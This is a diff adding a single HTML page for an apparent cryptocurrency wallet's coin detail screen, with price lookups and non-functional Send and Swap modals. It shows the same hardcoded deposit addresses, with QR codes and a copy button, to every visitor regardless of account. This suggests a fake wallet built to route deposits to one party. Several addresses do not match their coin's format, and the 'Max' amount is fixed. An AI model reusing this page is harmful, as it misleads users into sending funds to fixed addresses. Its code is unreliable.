@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="bootstrap.css">
+<link rel="stylesheet" type="text/css" href="bootstrap-icons.css">
+  <title>Coin Detail</title>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #ffff;
+      color: #111;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      padding: 20px;
+      text-align: center;
+    }
+    .coin-logo {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      margin: 20px auto 10px;
+    }
+    .coin-name { font-size: 22px; font-weight: bold; }
+    .coin-symbol {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 15px;
+    }
+    .balance {
+      font-size: 18px;
+      font-weight: bold;
+      margin: 8px 0;
+    }
+    .usd-value { color: #666; margin-bottom: 20px; }
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin: 20px 0;
+    }
+    .action {
+      flex: 1 1 30%;
+      background: #eee;
+      padding: 10px;
+      border-radius: 10px;
+      font-size: 13px;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+    .action:hover { background: #ddd; }
+    .action svg {
+      width: 20px;
+      height: 20px;
+      color: #444;
+    }
+    .price-section {
+      background: #fff;
+      border-radius: 12px;
+      padding: 16px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      margin-top: 20px;
+    }
+    .current-price { font-size: 16px; margin-bottom: 8px; }
+    .change {
+      font-size: 14px;
+      font-weight: bold;
+    }
+    .positive { color: green; }
+    .negative { color: red; }
+
+    #qr-section {
+      margin-top: 30px;
+      display: none;
+    }
+    #qr-image {
+      width: 150px;
+      height: 150px;
+      margin-top: 10px;
+    }
+    #wallet-address {
+      margin-top: 10px;
+      font-weight: bold;
+      word-break: break-word;
+      overflow-wrap: break-word;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    #wallet-text {
+      font-size: 100%;
+      cursor: pointer;
+      word-break: break-all;
+      overflow-wrap: break-word;
+      max-width: 100%;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.4);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      width: 300px;
+      text-align: center;
+      position: relative;
+    }
+    .modal input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .modal button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+    }
+    .modal button:hover {
+      background-color: #45a049;
+    }
+    .close {
+      color: #aaa;
+      font-size: 28px;
+      font-weight: bold;
+      position: absolute;
+      right: 20px;
+      top: 0;
+    }
+    .close:hover,
+    .close:focus {
+      color: black;
+      text-decoration: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+    
+      <div class="back-button" onclick="history.back()">
+    <svg viewBox="0 0 24 24" fill="none" stroke-width="2"> <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</div>
+
+<style>
+    .back-button {
+  position: fixed;
+  top: 10px;
+  left: 15px;
+  background-color: transparent;
+  color: #000000;
+  padding: 8px 14px;
+  border-radius: 6px;
+  font-size: 15px;
+  cursor: none;
+  z-index: 1000;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+}
+
+.back-button:hover {
+  background-color: transparent;
+}
+
+ svg {
+  width: 20px;
+  height: 20px;
+  stroke: #000000;
+    }    
+</style>
+ 
+  <div class="container">
+    <img id="coin-image" class="coin-logo" src="" alt="">
+    <div class="coin-name" id="coin-name">Loading...</div>
+    <div class="coin-symbol" id="coin-symbol"></div>
+    <div class="balance">0 <span id="coin-symbol-inline"></span></div>
+    <div class="usd-value">$0.00</div>
+
+    <div class="actions">
+      <div class="action" onclick="openModal('send')"><i data-lucide="send"></i>Send</div>
+     
+      <div class="action" onclick="openModal('swap')"><i data-lucide="repeat"></i>Swap</div>
+    </div>
+
+    <div class="price-section">
+      <div class="current-price" id="coin-price">Current Price: $0.00</div>
+      <div class="change" id="coin-change"></div>
+    </div>
+
+    <!-- QR and Wallet Address -->
+   <div id="qr-section">
+      <h4>Wallet Address QR</h4>
+      <img id="qr-image" src="" alt="QR Code" style="height: 210px; width: 210px; border-radius: 10%;" />
+      <div id="wallet-address">
+        <span style="display: flex; justify-content: center; align-items: flex-start; font-size: 100%;" id="wallet-text" style="cursor: pointer;"></span>
+        <i data-lucide="copy" id="copy-icon" style="cursor: pointer;"></i>
+      </div>
+    </div>
+
+  <!-- Modals -->
+
+<style>
+  .form-group {
+    margin-bottom: 20px;
+  }
+  label {
+    display: block;
+    margin-bottom: 8px;
+    color: #666;
+  }
+  select {
+    border: none;
+    flex: 1;
+    font-size: 16px;
+    outline: none;
+    border-radius: 10px;
+    padding: 5px;
+    background-color: transparent;
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+  }
+  .input-container {
+    border: 2px solid #3b82f6;
+    border-radius: 10px;
+    padding: 10px;
+    display: flex;
+    align-items: center;
+  }
+  input[type="text"], input[type="number"], select {
+    border: none;
+    flex: 1;
+    font-size: 20px;
+    outline: none;
+  }
+  .actions {
+    display: flex;
+    gap: 10px;
+  }
+  .actions button {
+    background: none;
+    border: none;
+    color: #3b82f6;
+    cursor: pointer;
+  }
+  .amount-container {
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    padding: 10px;
+    gap: 10px;
+  }
+  .usd-estimate {
+    color: #999;
+    margin-top: 5px;
+  }
+  .btn-next {
+    background-color: #a78bfa;
+    color: white;
+    padding: 15px;
+    text-align: center;
+    border: none;
+    border-radius: 25px;
+    width: 100%;
+    font-size: 16px;
+    cursor: not-allowed;
+    opacity: 0.5;
+  }
+  .btn-next.enabled {
+    cursor: pointer;
+    opacity: 1;
+  }
+  .modal-header {
+    display: flex;
+    
+    align-items: center;
+    margin-bottom: 20px;
+  }
+  .close-button {
+    font-size: 25px;
+    cursor: pointer;
+  }
+  .modal-header img {
+    width: 30px;
+    height: 30px;
+    object-fit: contain;
+    border-radius: 25px;
+  }
+</style>
+
+<!-- Modal for Send -->
+<div id="sendModal" class="modal">
+  <div class="modal-content" style="width: 95%;">
+
+    <div class="modal-header">
+      <div class="close-button bi bi-arrow-left-circle-fill" onclick="closePopup()"></div>
+      <img id="cryptoLogo" src="profile.png" alt="Crypto Logo" />
+     
+    </div>
+
+    <div class="form-group">
+      <label>Address or Domain Name</label>
+      <div class="input-container">
+        <input type="text" id="address" placeholder="Search or Enter"/>
+        <div class="actions">
+          <button onclick="pasteAddress()">Paste</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>Amount</label>
+      <div class="amount-container">
+        <input type="number" id="amount" placeholder="Amount" min="0" step="any" />
+        <select id="cryptoSelect" style="color: #0011b5;">
+            
+          <!-- 45+ common cryptocurrencies --> 
+          <option value="ETH">ETH</option>
+          <option value="BTC">BTC</option>
+          <option value="BNB">BNB</option>
+          <option value="SOL">SOL</option>
+          <option value="ADA">ADA</option>
+          <option value="XRP">XRP</option>
+          <option value="DOT">DOT</option>
+          <option value="TRX">TRX</option>
+          <option value="MATIC">MATIC</option>
+          <option value="SHIB">SHIB</option>
+          <option value="LTC">LTC</option>
+          <option value="AVAX">AVAX</option>
+          <option value="ATOM">ATOM</option>
+          <option value="XLM">XLM</option>          
+          <option value="NEAR">NEAR</option>
+          <option value="VET">VET</option>
+          <option value="FIL">FIL</option>
+          <option value="EGLD">EGLD</option>
+          <option value="FTM">FTM</option>
+          <option value="AAVE">AAVE</option>
+          <option value="XTZ">XTZ</option>
+          <option value="THETA">THETA</option>
+          <option value="ZEC">ZEC</option>
+          <option value="1INCH">1INCH</option>
+          <option value="KSM">KSM</option>
+          <option value="ALGO">ALGO</option>
+          <option value="YFI">YFI</option>
+          <option value="WAVES">WAVES</option>
+          <option value="REN">REN</option>
+        </select>
+        <button onclick="maxAmount()">Max</button>
+      </div>
+      <div class="usd-estimate" id="usdEstimate">≈ $0.00</div>
+    </div>
+
+    <button id="nextBtn" class="btn-next" disabled>Next</button>
+
+ <script>
+const addressInput = document.getElementById('address');
+const amountInput = document.getElementById('amount');
+const cryptoSelect = document.getElementById('cryptoSelect');
+const nextBtn = document.getElementById('nextBtn');
+const usdEstimate = document.getElementById('usdEstimate');
+const cryptoLogo = document.getElementById('cryptoLogo');
+
+// Map symbols to CoinGecko IDs
+const symbolToID = {
+  BTC: 'bitcoin',
+  ETH: 'ethereum',
+  BNB: 'binancecoin',
+  USDC: 'usd-coin',
+  XRP: 'ripple',
+  ADA: 'cardano',
+  SOL: 'solana',
+  DOT: 'polkadot',
+  TRX: 'tron',
+  LTC: 'litecoin',
+  BCH: 'bitcoin-cash',
+  XLM: 'stellar',
+  UNI: 'uniswap',
+  AAVE: 'aave',
+  MATIC: 'matic-network',
+  ATOM: 'cosmos',
+  ALGO: 'algorand',
+  FIL: 'filecoin',
+  VET: 'vechain',
+  EGLD: 'multiversx',
+  FTM: 'fantom',
+  XTZ: 'tezos',
+  THETA: 'theta-token',
+  ZEC: 'zcash',
+  KSM: 'kusama',
+  FLOW: 'flow',
+  YFI: 'yearn-finance',
+  WAVES: 'waves',
+  REN: 'ren',
+  NEAR: 'near',
+  SHIB: 'shiba-inu',
+  MKR: 'maker',
+  COMP: 'compound',
+  SNX: 'havven',
+  UMA: 'uma',
+  ZRX: '0x',
+  SUSHI: 'sushi'
+};
+
+const logoUrls = {
+  BTC: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/bitcoin/info/logo.png',
+  ETH: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png',
+  BNB: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png',
+  USDC: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/usd-coin/info/logo.png',
+  XRP: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ripple/info/logo.png',
+  ADA: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/cardano/info/logo.png',
+  SOL: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png',
+  DOT: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polkadot/info/logo.png',
+  TRX: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png',
+  LTC: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/litecoin/info/logo.png',
+  BCH: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/bitcoin-cash/info/logo.png',
+  XLM: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/stellar/info/logo.png',
+  UNI: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984/logo.png',
+  AAVE: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9/logo.png',
+  MATIC: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/info/logo.png',
+  ATOM: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/cosmos/info/logo.png',
+  ALGO: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/algorand/info/logo.png',
+  FIL: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/filecoin/info/logo.png',
+  VET: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/vechain/info/logo.png',
+  EGLD: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/elrond/info/logo.png',
+  FTM: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/fantom/info/logo.png',
+  XTZ: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tezos/info/logo.png',
+  THETA: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/theta/info/logo.png',
+  ZEC: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/zcash/info/logo.png',
+  KSM: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/kusama/info/logo.png',
+  YFI: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e/logo.png',
+  WAVES: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/waves/info/logo.png',
+  REN: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x408e41876cccdc0f92210600ef50372656052a38/logo.png',
+  NEAR: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/near/info/logo.png',
+  SHIB: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE/logo.png',
+  MKR: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2/logo.png',
+  COMP: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xc00e94cb662c3520282e6f5717214004a7f26888/logo.png',
+  SNX: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xc011a72400e58ecd99ee497cf89e3775d4bd732f/logo.png',
+  UMA: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x04fa0d235c4abf4bcf4787af4cf447de572ef828/logo.png',
+  ZRX: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xe41d2489571d322189246dafa5ebde1f4699f498/logo.png',
+  SUSHI: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6b3595068778dd592e39a122f4f5a5cf09c90fe2/logo.png'
+};
+
+let prices = {};
+
+async function fetchLivePrices() {
+  try {
+    const ids = Object.values(symbolToID).join(',');
+    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
+    const response = await fetch(url);
+    const data = await response.json();
+    prices = data;
+    updateEstimate();
+  } catch (error) {
+    console.error('Error fetching prices:', error);
+    usdEstimate.innerText = '≈ $0.00';
+  }
+}
+
+function pasteAddress() {
+  navigator.clipboard.readText().then(text => {
+    addressInput.value = text;
+    validateForm();
+  });
+}
+
+function maxAmount() {
+  amountInput.value = 1.23;
+  updateEstimate();
+  validateForm();
+}
+
+function updateEstimate() {
+  const amount = parseFloat(amountInput.value || 0);
+  const symbol = cryptoSelect.value.toUpperCase();
+  const coingeckoId = symbolToID[symbol];
+  const rate = prices[coingeckoId]?.usd || 0;
+  const usd = amount * rate;
+  usdEstimate.innerText = `≈ $${usd.toFixed(2)}`;
+}
+
+function updateLogo() {
+  const symbol = cryptoSelect.value.toUpperCase();
+  cryptoLogo.src = logoUrls[symbol] || 'https://via.placeholder.com/30';
+}
+
+function validateForm() {
+  const valid = addressInput.value.trim() && amountInput.value > 0;
+  nextBtn.disabled = !valid;
+  nextBtn.classList.toggle('enabled', valid);
+}
+
+addressInput.addEventListener('input', validateForm);
+amountInput.addEventListener('input', () => {
+  updateEstimate();
+  validateForm();
+});
+
+cryptoSelect.addEventListener('change', () => {
+  updateEstimate();
+  updateLogo();
+});
+
+function closePopup() {
+  document.getElementById('sendModal').style.display = 'none';
+}
+
+// Initialize
+fetchLivePrices();
+updateLogo();
+</script>
+
+ </div>
+  </div>
+
+  <!-- Modal for Swap -->
+  <div id="swapModal" class="modal">
+
+<style>
+    .label {
+      font-size: 15px;
+      color: gray;
+    }
+
+    .token-select {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 8px 0;
+    }
+
+    img {
+      width: 30px;
+      height: 30px;
+      border-radius: 10px;
+    }
+
+  input {
+    border: 2px solid #3b82f6;
+    border-radius: 10px;
+    padding: 10px;
+    display: flex;
+    align-items: center;
+}
+
+ input[type="number"] {
+    border: none;
+    font-size: 16px;
+    outline: none;
+  }
+    .buy-link {
+      position: absolute;
+      right: 12px;
+      top: 12px;
+      font-size: 14px;
+      color: #6c63ff;
+      cursor: pointer;
+    }
+
+    .usd-value {
+      font-size: 14px;
+      color: gray;
+      margin-top: 4px;
+    }
+
+    .swap-arrow {
+      text-align: center;
+      font-size: 35px;
+      margin: 8px 0;
+      background: none;
+    }
+
+    .rate {
+      text-align: center;
+      font-size: 14px;
+      color: gray;
+      margin: 8px 0;
+    }
+
+    .continue-btn {
+      width: 100%;
+      padding: 12px;
+      background: #a88bff;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 24px;
+      cursor: none;
+      margin-top: 8px;
+    }
+
+    .close-btn, .settings-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+    }
+</style>
+    <div class="modal-content" style="width: 95%;">
+        
+         <div class="modal-header">
+<div class="close-btn bi bi-arrow-right-circle-fill" onclick="document.getElementById('swapModal').style.display='none'" style="font-size: 25px; position: absolute; top: 20px; right: 30px;"></div>
+</div>
+
+  <div class="token-box">
+      <div class="label">From</div>
+      <div class="token-select">
+        <img id="fromLogo" src="" alt="From logo"/>
+        <select id="fromToken" style="background: none; border-radius: 5px;"></select>
+      </div>
+      <input type="number" id="fromAmount" placeholder="0.000"/>
+    </div>
+
+    <div class="token-box">
+      <div class="label">To</div>
+      <div class="token-select">
+        <img id="toLogo" src="" alt="To logo"/>
+        <select id="toToken" style="background: none; border-radius: 5px;"></select>
+      </div>
+      <input type="number" id="toAmount" placeholder="0.0000" disabled/>
+      <div class="usd-value" id="usdValue">$0.00</div>
+    </div>
+
+    <div class="rate" id="rate">Exchange Rate: -</div>
+    <button class="continue-btn">Continue</button>
+  </div>
+
+  <script>
+    const tokens = {
+      BTC: { name: "Bitcoin", logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png", id: "bitcoin" },
+      ETH: { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png", id: "ethereum" },
+      USDC: { name: "USD Coin", logo: "https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png", id: "usd-coin" },
+      BNB: { name: "BNB", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png", id: "binancecoin" },
+      XRP: { name: "XRP", logo: "https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png", id: "ripple" },
+      ADA: { name: "Cardano", logo: "https://assets.coingecko.com/coins/images/975/small/cardano.png", id: "cardano" },
+      SOL: { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/Solana.png", id: "solana" },
+      MATIC: { name: "Polygon", logo: "https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png", id: "matic-network" },
+      DOT: { name: "Polkadot", logo: "https://assets.coingecko.com/coins/images/12171/small/polkadot.png", id: "polkadot" },
+      DOGE: { name: "Dogecoin", logo: "https://assets.coingecko.com/coins/images/5/small/dogecoin.png", id: "dogecoin" },
+      LTC: { name: "Litecoin", logo: "https://assets.coingecko.com/coins/images/2/small/litecoin.png", id: "litecoin" },
+      AVAX: { name: "Avalanche", logo: "https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle.png", id: "avalanche-2" },
+      TRX: { name: "Tron", logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png", id: "tron" },
+      UNI: { name: "Uniswap", logo: "https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png", id: "uniswap" },
+      XLM: { name: "Stellar", logo: "https://assets.coingecko.com/coins/images/100/small/Stellar_symbol_black_RGB.png", id: "stellar" },
+      LINK: { name: "Chainlink", logo: "https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png", id: "chainlink" },
+      AAVE: { name: "Aave", logo: "https://assets.coingecko.com/coins/images/12645/small/AAVE.png", id: "aave" },
+      ATOM: { name: "Cosmos", logo: "https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png", id: "cosmos" },
+      FIL: { name: "Filecoin", logo: "https://assets.coingecko.com/coins/images/12817/small/filecoin.png", id: "filecoin" }
+    };
+
+    const fromToken = document.getElementById("fromToken");
+    const toToken = document.getElementById("toToken");
+    const fromAmount = document.getElementById("fromAmount");
+    const toAmount = document.getElementById("toAmount");
+    const usdValue = document.getElementById("usdValue");
+    const rate = document.getElementById("rate");
+    const fromLogo = document.getElementById("fromLogo");
+    const toLogo = document.getElementById("toLogo");
+
+    // Populate dropdowns
+    Object.keys(tokens).forEach(key => {
+      const opt1 = document.createElement("option");
+      opt1.value = key;
+      opt1.text = tokens[key].name;
+      fromToken.appendChild(opt1);
+
+      const opt2 = document.createElement("option");
+      opt2.value = key;
+      opt2.text = tokens[key].name;
+      toToken.appendChild(opt2);
+    });
+
+    // Default selections
+    fromToken.value = "ETH";
+    toToken.value = "USDC";
+    fromLogo.src = tokens["ETH"].logo;
+    toLogo.src = tokens["USDC"].logo;
+
+    async function fetchPrices() {
+      const ids = [tokens[fromToken.value].id, tokens[toToken.value].id];
+      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(",")}&vs_currencies=usd`;
+      const res = await fetch(url);
+      return res.json();
+    }
+
+    async function updateValues() {
+      const value = parseFloat(fromAmount.value);
+      if (!value || value <= 0) {
+        toAmount.value = "";
+        usdValue.innerText = "$0.00";
+        rate.innerText = "Exchange Rate: -";
+        return;
+      }
+
+      const prices = await fetchPrices();
+      const fromUSD = prices[tokens[fromToken.value].id].usd;
+      const toUSD = prices[tokens[toToken.value].id].usd;
+
+      const converted = (value * fromUSD) / toUSD;
+      toAmount.value = converted.toFixed(6);
+      usdValue.innerText = "$" + (converted * toUSD).toFixed(2);
+      rate.innerText = `Exchange Rate: 1 ${fromToken.value} ≈ ${(fromUSD / toUSD).toFixed(6)} ${toToken.value}`;
+    }
+
+    fromAmount.addEventListener("input", updateValues);
+    fromToken.addEventListener("change", () => {
+      fromLogo.src = tokens[fromToken.value].logo;
+      updateValues();
+    });
+    toToken.addEventListener("change", () => {
+      toLogo.src = tokens[toToken.value].logo;
+      updateValues();
+    });
+
+    updateValues();
+  </script>    
+     
+   </div>
+     </div>
+ <script>  
+     lucide.createIcons();  
+  
+    function openModal(action) {  
+      document.getElementById(`${action}Modal`).style.display = 'flex';  
+    }  
+  
+    function closeModal(action) {  
+      document.getElementById(`${action}Modal`).style.display = 'none';  
+    }  
+  
+    const walletAddresses = {  
+      BTC: "bc1qcpa5ys9nqhyvauxqcme6wyaztwc5pngyu4mjdm",  
+      ETH: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      USDT: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      BNB: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      XRP: "CKtvLCqzt3ErZ1DtwkC866FYnmkzwKQtdaeHSdp1P6Qw",  
+      SOL: "CKtvLCqzt3ErZ1DtwkC866FYnmkzwKQtdaeHSdp1P6Qw",  
+      USDC: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      DOGE: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      ADA: "addr1q9sqmz35s600mk08l4u6ptrwrm9szjaputytcyp9y30jgtfuwv54lvu0u2qh0clzmyumfpnegyqs0utqmuegadxdfeqqszqs6u",  
+      TRX: "TTGJvtsRcaCs5ygcFgW8mdme8ouw73RAMa",  
+      WBTC: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      SUI: "0x5b9998c649e0ca133a1d108ed9e4b12d4b192a6310d57793341029319f7222c2",  
+      LINK: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",        
+      AVAX: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      LEO: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      XLM: "GAXF75YHDZVZVUG2YTL5XEHVF7PHPWWJFGNKFT5TG7LRHBWJSO7SNBTC",  
+      TON: "UQD0_0QEI79kAJvYPZktckOFBCfydnFkeNaHEXYJOBPgPvyB",  
+      USDS: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      WSTETH: "terra1zckna82eta6y5rdsggkcw04hnuhmmkh68j46a7",  
+      BCH: "qq6p3a8nzm3mdpxwp9nk67jx3c583zlk7yve9qkmu4",  
+      LTC: "ltc1qknz8upg87knr00vp6ksv8leq85u55z59lyt7e0",  
+      DOT: "13eCFYGTPSCg2ELQpzjb9joGeDtGrutQMjWpoN2YtKzNSHJA",  
+      XMR: "0x88e8D1844447cad194eF93079dBdC65Beacdb53D",  
+      WETH: "cro14sznjpdjhs8pnvwwwjdq7nkvt2q7c706qe8zn6",  
+        
+      BGB: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+  
+  
+        
+      USDE: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",           
+      USDE: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      CBBTC: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      WEETH: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      PI: "CKtvLCqzt3ErZ1DtwkC866FYnmkzwKQtdaeHSdp1P6Qw",  
+      WBT: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      PEPE: "CKtvLCqzt3ErZ1DtwkC866FYnmkzwKQtdaeHSdp1P6Qw",  
+      DAI: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      TAO: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      UNI: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      OKB: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      STETH: "0x52ae7cb278d87d73bc621d8c66f8616644882355e2dcc299c560ba34368610ad",  
+      UNI: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      NEAR: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      ONDO: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",           
+      ICP: "a2133aecadfd8b0e26cf339055f10242fa09e1a7448764cee004a1777a255161",  
+      ETC: "0x88e8D1844447cad194eF93079dBdC65Beacdb53D",  
+      AAVE: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",  
+      CRO: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",   
+      SHIB: "0x167858614a76D0A12947Fa7757AD03A3926B5D66",             
+    };  
+  
+    const params = new URLSearchParams(window.location.search);  
+    const coinId = params.get("id");  
+  
+    if (coinId) {  
+      fetch(`https://api.coingecko.com/api/v3/coins/${coinId}`)  
+        .then(res => res.json())  
+        .then(data => {  
+          const name = data.name;  
+          const symbol = data.symbol.toUpperCase();  
+          const price = data.market_data.current_price.usd;  
+          const change = data.market_data.price_change_percentage_24h;  
+  
+          document.getElementById('coin-name').innerText = name;  
+          document.getElementById('coin-symbol').innerText = `(${symbol})`;  
+          document.getElementById('coin-symbol-inline').innerText = symbol;  
+          document.getElementById('coin-image').src = data.image.large;  
+          document.getElementById('coin-price').innerText = `Current Price: $${price.toLocaleString()}`;  
+          document.querySelector('.usd-value').innerText = `$${(price * 0).toFixed(2)}`;  
+  
+          const changeElem = document.getElementById('coin-change');  
+          changeElem.innerText = `${change.toFixed(2)}% (24h)`;  
+          changeElem.className = `change ${change >= 0 ? 'positive' : 'negative'}`;  
+  
+          const address = walletAddresses[symbol] || "Wallet address not available";  
+          const qrImage = document.getElementById("qr-image");  
+          const walletText = document.getElementById("wallet-text");  
+          const qrSection = document.getElementById("qr-section");  
+  
+          qrImage.src = `${symbol}.jpg`;  
+          walletText.innerText = address;  
+          qrSection.style.display = "block";  
+  
+          function copyToClipboard(text) {  
+            if (!text || text === "Wallet address not available") return;  
+            navigator.clipboard.writeText(text).then(() => {  
+              walletText.innerText = "Copied!";  
+              setTimeout(() => {  
+                walletText.innerText = address;  
+              }, 1500);  
+            });  
+          }  
+  
+          document.getElementById("wallet-text").onclick = () => copyToClipboard(address);  
+          document.getElementById("copy-icon").onclick = () => copyToClipboard(address);  
+  
+          lucide.createIcons(); // Refresh icons after DOM update  
+        });  
+    } else {  
+      document.body.innerHTML = "<p>Failed to load page!</p>";  
+    }  
+  </script>
+  <script src="disable-zoom.js"></script>
+ </body>
+</html>
